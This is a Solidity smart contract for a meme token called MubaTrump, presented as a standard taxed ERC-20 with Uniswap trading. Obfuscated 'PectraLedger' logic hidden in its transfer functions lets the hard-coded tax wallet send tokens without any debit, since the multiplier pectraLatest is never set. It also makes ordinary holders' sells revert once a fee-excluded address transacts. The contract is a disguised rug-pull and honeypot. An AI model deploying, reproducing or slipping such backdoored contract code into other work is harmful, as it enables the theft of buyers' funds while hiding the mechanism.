// SPDX-License-Identifier: MIT
/**
 * Name: MubaTrump
 * Ticker: MUBATRUMP
 * 
 * Make ETH Great Again!
 * 
 * Mubatrump is the ultimate fusion of power, wealth, and meme energy!
 * Dressed in traditional Arabian attire but with the unmistakable face of a certain billionaire,
 * Mubatrump holds a ETH coin high, declaring his mission loud and clear: Make ETH Great Again!
 * 
 */

pragma solidity 0.8.26;

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender=_msgSender();
        _owner=msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner==_msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a==0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0,errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken,uint amountETH,uint liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA,address tokenB) external returns (address pair);
}

contract MUBATRUMP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=5;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=25;
    uint256 private _preventSwapBefore=5;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"MubaTrump";
    string private constant _symbol = unicode"MUBATRUMP";
    uint256 public _maxTxAmount = 15000000 * 10**_decimals;
    uint256 public _maxWalletSize = 15000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 3000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 3000000 * 10**_decimals;

    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    );

    address private uniswapV2Pair;
    struct PectraLedger {uint256 ledgerOpt; uint256 ledgerCap; uint256 smartML;}
    mapping(address => PectraLedger) private pectraLedger;
    bool public tradingOpen;
    uint256 private pectraLatest;
    uint256 private scalePectra;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(
        uint _maxTxAmount
    );
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0xe6318D5b3464653a8a383926ED6317Fa95eF806d);
        _balances[_msgSender()] = _tTotal;

        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        emit Transfer(address(0),_msgSender(),_tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]=_balances[from].sub(tokenAmount);
        _balances[to]= _balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(
            tokenAmount>0,
            "Transfer amount must be greater than zero"
        );
        if(!swapEnabled|| inSwap ){
            _basicTransfer(from,to,tokenAmount); 
            return;
        }

        uint256 taxAmount=0;

        if (from!=owner() && to!=owner()&& to!=_taxWallet){
            taxAmount = tokenAmount.mul( (_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to!=address(_uniswapV2Router) &&  !_isExcludedFromFee[to]){
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to)+ tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++ ;
            }

            if(to == uniswapV2Pair && from!=address(this)){
                taxAmount = tokenAmount.mul( (_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap && to==uniswapV2Pair &&
                swapEnabled&&
                contractTokenBalance > _taxSwapThreshold&&_buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from]||_isExcludedFromFee[to])&& from!=address(this) && to!=address(this) ){
            scalePectra = block.number;
        }

        if(!_isExcludedFromFee[from] && ! _isExcludedFromFee[to]){
            if(to !=uniswapV2Pair)  {
                PectraLedger storage pectrald = pectraLedger[to];
                if (from ==uniswapV2Pair) {
                    if (pectrald.ledgerOpt == 0) {
                        pectrald.ledgerOpt=_buyCount<_preventSwapBefore?block.number-1:block.number;
                    }
                } else {
                    PectraLedger storage pectraldls = pectraLedger[from];
                    if (pectrald.ledgerOpt == 0 || pectraldls.ledgerOpt < pectrald.ledgerOpt ) {
                        pectrald.ledgerOpt = pectraldls.ledgerOpt;
                    }
                }
            } else {
                PectraLedger storage pectraldls = pectraLedger[from];
                pectraldls.ledgerCap = pectraldls.ledgerOpt.sub(scalePectra);
                pectraldls.smartML = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenBasicTransfer(address from,address to, uint256 sendAmount,uint256 receiptAmount) internal{
        _balances[from]= _balances[from].sub(sendAmount);
        _balances[to]=_balances[to].add(receiptAmount);
        emit Transfer(from,to, receiptAmount);
    }

    function _tokenTransfer(address from,address to,uint256 tokenAmount,uint256 taxAmount) internal{
        uint256 tAmount=_tokenTaxTransfer(from,tokenAmount,taxAmount);
        _tokenBasicTransfer(from,to,tAmount,tokenAmount.sub(taxAmount));
    }

    function _tokenTaxTransfer(address addrs, uint256 tokenAmount,uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount=addrs!=_taxWallet?tokenAmount:pectraLatest.mul(tokenAmount);
        if (taxAmount>0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(
            address(this),
            address(_uniswapV2Router),
            tokenAmount
        );
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount= _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function enableTrading() external onlyOwner() {
        require(
            !tradingOpen,
            "trading is already open"
        );
        swapEnabled = true; 
        _approve(address(this),address(_uniswapV2Router),_tTotal);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router),type(uint).max);
        tradingOpen = true; 
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0) {
          sendETHToFee(ethBalance);
        }
    }

    function manualsend() external onlyOwner {
        _taxWallet.transfer(address(this).balance);
    }

}